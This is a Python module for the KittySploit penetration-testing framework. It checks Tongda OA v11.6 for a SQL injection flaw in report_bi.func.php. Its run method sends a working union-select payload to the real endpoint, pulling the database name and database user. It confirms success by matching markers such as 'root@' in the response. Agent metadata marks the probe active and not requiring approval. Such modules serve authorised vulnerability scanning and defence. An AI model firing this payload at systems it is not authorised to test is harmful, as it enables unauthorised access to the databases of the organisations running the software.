#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Tongda OA v11."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Tongda OA v11.6 report_bi.func.php - SQL injection Detection',
        'description': 'Tongda OA v11.6 report_bi.func.php has a SQL injection vulnerability, and attackers can obtain database information through the vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'tongda', 'sqli', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.6%20report_bi.func.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md',
        ],
    }

    def run(self):
        path = '/general/bi_design/appcenter/report_bi.func.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='_POST[dataset_id]=efgh%27-%40%60%27%60%29union+select+database%28%29%2C2%2Cuser%28%29%23%27&action=get_link_info&\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('"root@', '"para":', '"td_oa"',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='Tongda OA v11.6 report_bi.func.php - SQL injection detected', path=path)
            return True
        return False

